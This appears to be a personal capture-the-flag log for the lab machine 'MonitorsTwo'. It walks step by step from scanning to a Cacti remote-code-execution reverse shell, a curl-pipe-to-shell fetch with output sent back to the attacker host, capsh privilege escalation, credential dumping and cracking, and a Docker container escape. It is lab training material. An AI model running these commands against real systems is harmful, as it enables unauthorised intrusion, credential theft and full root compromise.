@@ -1,0 +1,729 @@
+2023-04-30 00:53:25 CDT -- START TIME
+
+### MonitorsTwo ###
+--------------------------------------
+|================================================================
+- Name: monitorstwo 
+- IP Address: 10.129.231.163
+- OS: 5.4.0-147-generic | Debian GNU/Linux 11 (bullseye) | x64 
+	5.4.0-147-generic | Ubuntu 20.04.6 LTS | x64
+- Notes: 
+
+//CREDS:
+	//User: marcus
+	//Pass: funkymonkey
+
+//MYSQL(db)
+	//User: root
+	//Pass: root
+
+//Flags:
+#User:		2264a7d4590bbf73e5ea0104ca954309
+#System:	dc7755ebc41973b8c61f644306fa5a40
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=10.129.231.163
+
+2023-04-30 00:58:03 CDT -- 
+ports=$(nmap -e tun0 -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//22,80
+
+2023-04-30 00:59:27 CDT -- 
+sudo nmap -e tun0 -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Login to Cacti
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+
+2023-04-30 01:02:34 CDT -- 
+# UDP scan
+sudo nmap -e tun0 -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+### EXTRA
+2023-04-30 01:10:50 CDT -- 
+#Vuln Scan
+sudo nmap -e tun0 -Pn -sV --script=default,vuln -p$ports $ip -oN vuln.nmap
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-sql-injection: 
+|   Possible sqli for queries:
+|     http://10.129.231.163:80/include/js/billboard.js?9a354b4a145f51a33bd39f8e5f042a23=%27%20OR%20sqlspider
+|     http://10.129.231.163:80/include/js/jquery.tablesorter.pager.js?8ca32d30195c98492cd028f582f07c8c=%27%20OR%20sqlspider
+|     http://10.129.231.163:80/include/js/d3.js?62b21cab0960a061cb893852bfc74cfa=%27%20OR%20sqlspider
+|_    http://10.129.231.163:80/include/js/dygraph-combined.js?b5b448f71f8c3eb4a39506299bd81b0c=%27%20OR%20sqlspider
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|_  /docs/: Potentially interesting folder
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+|_http-title: Login to Cacti
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// gobuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-30 01:26:05 CDT -- 
+// directory brute force
+gobuster dir -u http://10.129.231.163 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,htm -o gobuster-80.txt
+
+egrep 'Status: 2..' gobuster-80.txt 
+/about.php            (Status: 200) [Size: 13844]
+/cmd.php              (Status: 200) [Size: 93]
+/graph.php            (Status: 200) [Size: 13828]
+/help.php             (Status: 200) [Size: 13843]
+/host.php             (Status: 200) [Size: 13843]
+/index.php            (Status: 200) [Size: 13844]
+/index.php            (Status: 200) [Size: 13844]
+/LICENSE              (Status: 200) [Size: 15171]
+/links.php            (Status: 200) [Size: 13844]
+/plugins.php          (Status: 200) [Size: 13846]
+/settings.php         (Status: 200) [Size: 13847]
+/sites.php            (Status: 200) [Size: 13844]
+/tree.php             (Status: 200) [Size: 13843]
+/utilities.php        (Status: 200) [Size: 13848]
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// nikto -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-30 01:35:37 CDT -- 
+// scan website
+nikto -h http://10.129.231.163 -o nikto_scan.txt
+
++ Server: nginx/1.18.0 (Ubuntu)
++ /install/install.php: Install file found.
++ /help.php: A help file was found.
++ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
++ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
++ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
++ /shell?cat+/etc/hosts: A backdoor was identified.
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ /README.md: Readme Found.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//BURP-Browse
+http://10.129.231.163/
+
+//Login Page
+//Version 1.2.22 | (c) 2004-2023 - The Cacti Group
+
+
+// EXPLOIT (CVE-2022-46169)
+// Google: cacti exploit github
+// This vulnerability affects Cacti, version 1.2.22, released on August 18, 2022.
+https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-30 02:06:13 CDT -- 
+wget https://raw.githubusercontent.com/ariyaadinatha/cacti-cve-2022-46169-exploit/main/cacti.py
+
+//Exploit Changes
+targetURL = "http://10.129.231.163:80"
+# RCE payload
+        ipAddress = "10.10.16.2"
+        port = "6969"
+
+//StartListener
+rlwrap -cAr nc -lvnp 6969
+
+2023-04-30 02:10:40 CDT -- 
+//RunExploit
+python3 cacti.py
+
+//SUCCESS
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ENUM (www-data)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+hostname
+50bca5e748b0
+
+uname -a
+Linux 50bca5e748b0 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 GNU/Linux
+
+cat /etc/*lease | egrep -i pretty
+PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
+
+ps -ef fw
+//Just my processes
+
+netstat -antp
+//NOt found
+
+ss
+//Not Found
+
+cat /etc/hosts
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.19.0.3      50bca5e748b0
+
+//172.19.0.3 ip for container
+
+lsof -Pni
+//Not found
+
+
+//I feel like this is an container!
+ls -lah /
+-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
+//Yep, in a container
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// install peass
+sudo apt install -y peass
+
+// get a copy of linpeas shell script or binary
+cp /usr/share/peass/linpeas/linpeas.sh .
+
+mktemp -d
+/tmp/tmp.kKaBlGzRmW
+
+cd /tmp/tmp.kKaBlGzRmW
+
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 80
+  // kali term2
+nc -lvnp 443 | tee linpeas_wwwData.out
+
+2023-04-30 02:54:38 CDT --  
+ // target
+curl http://10.10.16.2:80/linpeas.sh | sh | curl -X POST --data-binary @linpeas.out http://10.10.16.2:443
+
+//Interesting
+═╣ Is this a container? ........... docker                                                                                                         
+═╣ Any running containers? ........ No
+╔══════════╣ Docker Container details                                                                                                              
+═╣ Am I inside Docker group ....... No                                                                                                             
+═╣ Looking and enumerating Docker Sockets (if any):
+═╣ Docker version ................. Not Found                                                                                                      
+═╣ Vulnerable to CVE-2019-5736 .... Not Found                                                                                                      
+═╣ Vulnerable to CVE-2019-13139 ... Not Found                                                                                                      
+═╣ Rootless Docker? ............... No
+
+╔══════════╣ MySQL version
+mysql  Ver 15.1 Distrib 10.5.15-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper
+
+══╣ Possible private SSH keys were found!
+/var/www/html/include/vendor/phpseclib/Crypt/RSA.php
+
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh
+
+
+╔══════════╣ Unexpected in root
+/.dockerenv                                                                                                /entrypoint.sh
+
+╔══════════╣ Searching passwords in config PHP files
+#$rdatabase_password = 'cactiuser';                                                                        $database_password = 'root';
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//capsh PrivEsc
+https://gtfobins.github.io/gtfobins/capsh/#suid
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh
+//SUID bit on capsh
+
+2023-04-30 03:17:38 CDT -- 
+capsh --gid=0 --uid=0 --
+
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+//SUCCESS
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+ls -lah /entrypoint.sh
+-rw-r--r-- 1 root root 648 Jan  5 11:37 /entrypoint.sh
+
+//Checking out this shell script found in /
+cat /entrypoint.sh
+
+// entrypoint.sh
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#!/bin/bash
+set -ex
+
+wait-for-it db:3306 -t 300 -- echo "database is connected"
+if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
+    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
+    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
+    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
+fi
+
+chown www-data:www-data -R /var/www/html
+# first arg is `-f` or `--some-option`
+if [ "${1#-}" != "$1" ]; then
+        set -- apache2-foreground "$@"
+fi
+
+exec "$@"
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- mysql client --
+//Entries from entrypoint.sh
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-30 03:35:35 CDT -- 
+mysql --host=db --user=root --password=root cacti -e "show tables"
+//SUCCESS
+//Lots of Tables, user_* tables looks interesting
+
+//Lets try other mysql commands
+
+2023-04-30 03:36:38 CDT -- 
+mysql --host=db --user=root --password=root cacti -e "show grants;"
+
+Grants for root@%
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION
+
+2023-04-30 03:41:43 CDT -- 
+mysql --host=db --user=root --password=root cacti -e "show databases;"
+Database
+information_schema
+cacti
+mysql
+performance_schema
+sys
+
+2023-04-30 03:44:21 CDT -- 
+mysql --host=db --user=root --password=root cacti -e "SHOW columns FROM user_auth;"
+Field   Type    Null    Key     Default Extra
+id      mediumint(8) unsigned   NO      PRI     NULL    auto_increment
+username        varchar(50)     NO      MUL     0
+password        varchar(256)    NO
+realm   mediumint(8)    NO      MUL     0
+full_name       varchar(100)    YES             0
+email_address   varchar(128)    YES             NULL
+must_change_password    char(2) YES             NULL
+password_change char(2) YES             on
+show_tree       char(2) YES             on
+show_list       char(2) YES             on
+show_preview    char(2) NO              on
+graph_settings  char(2) YES             NULL
+login_opts      tinyint(3) unsigned     NO              1
+policy_graphs   tinyint(3) unsigned     NO              1
+policy_trees    tinyint(3) unsigned     NO              1
+policy_hosts    tinyint(3) unsigned     NO              1
+policy_graph_templates  tinyint(3) unsigned     NO              1
+enabled char(2) NO      MUL     on
+lastchange      int(11) NO              -1
+lastlogin       int(11) NO              -1
+password_history        varchar(4096)   NO              -1
+locked  varchar(3)      NO
+failed_attempts int(5)  NO              0
+lastfail        int(10) unsigned        NO              0
+reset_perms     int(10) unsigned        NO              0
+
+2023-04-30 03:48:01 CDT -- 
+mysql --host=db --user=root --password=root cacti -e "SELECT username,password,full_name,email_address FROM user_auth;"
+
+username        password        full_name       email_address
+admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    Jamie Thompson  admin@monitorstwo.htb
+guest   43e9a4ab75570f5b        Guest Account
+marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    Marcus Brune    marcus@monitorstwo.htb
+
+//CREDS:
+	admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
+	marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.129.231.163\tmonitorstwo.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Password Crack
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+hashid -j '$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC'
+[+] Blowfish(OpenBSD) [JtR Format: bcrypt]
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt [JtR Format: bcrypt]
+
+hashid -j '$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C'      
+[+] Blowfish(OpenBSD) [JtR Format: bcrypt]
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt [JtR Format: bcrypt]
+
+sudo gunzip -d /usr/share/wordlists/rockyou.txt.gz
+
+2023-04-30 03:57:12 CDT -- 
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt mysql.hash
+
+funkymonkey      (marcus)
+
+//admin is taking WAY to long
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Trying marcus password with SSH
+
+
+// SSH
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-30 04:11:00 CDT -- 
+// connect SSH w/ SOCKS proxy
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" marcus@10.129.231.163 -D 9050
+//Pass: funkymonkey
+
+//SUCCESS
+
+id
+uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
+
+cat /home/marcus/user.txt 
+// 2264a7d4590bbf73e5ea0104ca954309
+
+2023-04-30 04:27:51 CDT -- 
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ENUM (marcus)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+hostname
+monitorstwo
+
+uname -a
+Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+
+cat /etc/*elease | egrep -i pretty
+PRETTY_NAME="Ubuntu 20.04.6 LTS"
+
+sudo -ll
+[sudo] password for marcus: 
+Sorry, user marcus may not run sudo on localhost.
+
+ps -ef fw
+//Nothing of interest
+
+netstat -ant
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:37911         0.0.0.0:*               LISTEN
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+marcus:x:1000:1000:,,,:/home/marcus:/bin/bash
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-30 04:34:26 CDT -- 
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 80
+  // kali term2
+nc -lvnp 443 | tee linpeas_marcus.out
+  // target
+curl 10.10.16.2:80/linpeas.sh | sh | nc 10.10.16.2 443
+
+less -r linpeas_marcus.out
+
+//INteresting
+╔══════════╣ Hostname, hosts and DNS
+monitorstwo                                                                                                                                           
+127.0.0.1 localhost monitorstwo monitorstwo.htb
+127.0.1.1 ubuntu
+
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+nameserver 127.0.0.53
+options edns0 trust-ad
+
+╔══════════╣ Interfaces
+br-60ea49c21773: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
+br-7c3b7c0d00b3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
+docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.129.231.163  netmask 255.255.0.0  broadcast 10.129.255.255
+
+lrwxrwxrwx 1 root root 34 Jan  9 10:03 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
+server {
+        listen 80 default_server;
+        listen [::]:80 default_server;
+        server_name cacti.monitorstwo.htb;
+        server_name _;
+        location / {
+                proxy_pass http://127.0.0.1:8080/;
+        }
+
+//Listens on port 80 and proxies to 127.0.0.1:8080 on incoming connections
+
+╔══════════╣ Searching ssl/ssh files
+PermitRootLogin yes                                                                                                                  
+ChallengeResponseAuthentication no
+UsePAM yes
+PasswordAuthentication yes
+
+╔══════════╣ Mails (limit 50)
+     4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/mail/marcus                                      4721      4 -rw-r--r--   1 root     mail         1809 Oct 18  2021 /var/spool/mail/marcus
+
+cat /var/mail/marcus
+From: administrator@monitorstwo.htb
+To: all@monitorstwo.htb
+Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
+
+Dear all,
+
+We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.
+
+CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.
+
+CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.
+
+CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.
+
+We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
+
+Best regards,
+
+Administrator
+CISO
+Monitor Two
+Security Team
+
+//Based on Email, vulns of interest:
+	//CVE-2021-33033
+	//CVE-2020-25706 (CVE-2022-46169, to exploit this)
+	//CVE-2021-41091
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+// EXPLOIT CVE-2021-41091
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-30 05:08:31 CDT -- 
+docker version
+Client:
+ Version:           20.10.5+dfsg1
+ API version:       1.41
+ Go version:        go1.15.9
+ Git commit:        55c4c88
+ Built:             Wed Aug  4 19:55:57 2021
+ OS/Arch:           linux/amd64
+ Context:           default
+ Experimental:      true
+
+//NOTE: Moby is an open-source project created by Docker to enable software containerization. A bug was found in Moby (Docker Engine) where the data directory (typically `/var/lib/docker`) contained subdirectories with insufficiently restricted permissions, allowing otherwise unprivileged Linux users to traverse directory contents and execute programs. 
+//This bug has been fixed in Moby (Docker Engine) 20.10.9.
+
+
+df -h
+Filesystem      Size  Used Avail Use% Mounted on
+udev            1.9G     0  1.9G   0% /dev
+tmpfs           394M  1.3M  392M   1% /run
+/dev/sda2       6.8G  4.4G  2.4G  66% /
+tmpfs           2.0G     0  2.0G   0% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
+overlay         6.8G  4.4G  2.4G  66% /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+shm              64M     0   64M   0% /var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
+overlay         6.8G  4.4G  2.4G  66% /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+shm              64M     0   64M   0% /var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
+tmpfs           394M     0  394M   0% /run/user/1000
+
+//Docker FileSystem
+2023-04-30 05:22:02 CDT -- 
+ls /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+bin   dev                         entrypoint.sh  home  lib64  mnt  proc  run   srv  tmp  var
+boot  docker-entrypoint-initdb.d  etc            lib   media  opt  root  sbin  sys  usr
+
+ls /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+bin   dev            etc   lib    media  opt   root  sbin  sys  usr
+boot  entrypoint.sh  home  lib64  mnt    proc  run   srv   tmp  var
+
+//FileSystem
+2023-04-30 05:22:11 CDT -- 
+ls /
+bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  var
+boot  dev    home  lib32  libx32  media       opt  root  sbin  sys  usr
+
+//Can see the docker file system under /var/lib/docker/*
+
+//Since I have root in the capsh: 
+//I can copy bash and change the files capabilities in /var/lib/docker/* and add SUID bit to execute it in marcus's SSH session.
+
+
+//Privesc/Container Escape
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities
+
+capsh --print
+Current: cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap=eip
+Bounding set =cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap
+Ambient set =
+Current IAB: cap_chown,!cap_dac_override,!cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,!cap_linux_immutable,cap_net_bind_service,!cap_net_broadcast,!cap_net_admin,cap_net_raw,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,cap_sys_chroot,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,cap_audit_write,!cap_audit_control,cap_setfcap,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+ secure-no-ambient-raise: no (unlocked)
+uid=0(root) euid=0(root)
+gid=0(root)
+groups=33(www-data)
+Guessed mode: UNCERTAIN (0)
+
+//NOTE: Shell has cap_setuid and cap_setgid capability
+
+//From capsh shell:
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+mktemp -d
+/tmp/tmp.iEY196H8ox
+
+chmod 777 /tmp/tmp.iEY196H8ox
+
+cp /bin/bash /tmp/tmp.iEY196H8ox
+
+ls -lah /tmp/tmp.iEY196H8ox/bash
+-rwxr-xr-x 1 root root 1.2M Apr 30 10:29 /tmp/tmp.iEY196H8ox/bash
+
+//Get file capabilities
+getcap /tmp/tmp.iEY196H8ox/bash
+//Nothing
+
+//Set file capabilities
+setcap cap_setuid+eip /tmp/tmp.iEY196H8ox/bash
+
+//NOTE: The +eip means you’re adding the capability (“-” would remove it) as Effective, Inherited, and Permitted.
+
+//Get file capabilities
+getcap /tmp/tmp.iEY196H8ox/bash
+/tmp/tmp.iEY196H8ox/bash cap_setuid=eip
+
+//Add SUID Bit
+chmod +s /tmp/tmp.iEY196H8ox/bash
+
+ls -lah /tmp/tmp.iEY196H8ox/bash
+-rwsr-sr-x 1 root root 1.2M Apr 30 10:29 /tmp/tmp.iEY196H8ox/bash
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//From marcus SSH shell:
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-04-30 06:09:32 CDT -- 
+ls /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/tmp.iEY196H8ox/bash
+// No such file or directory
+
+2023-04-30 06:09:40 CDT -- 
+ls /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/tmp.iEY196H8ox/bash
+// FILE FOUND
+
+//Run Bash
+2023-04-30 06:13:26 CDT -- 
+/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/tmp.iEY196H8ox/bash -p
+
+id
+uid=1000(marcus) gid=1000(marcus) euid=0(root) egid=0(root) groups=0(root),1000(marcus)
+
+//SUCCESS
+
+cat /root/root.txt 
+// dc7755ebc41973b8c61f644306fa5a40
+
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2023-04-30 06:34:16 CDT -- COMPLETE!!!
+
+
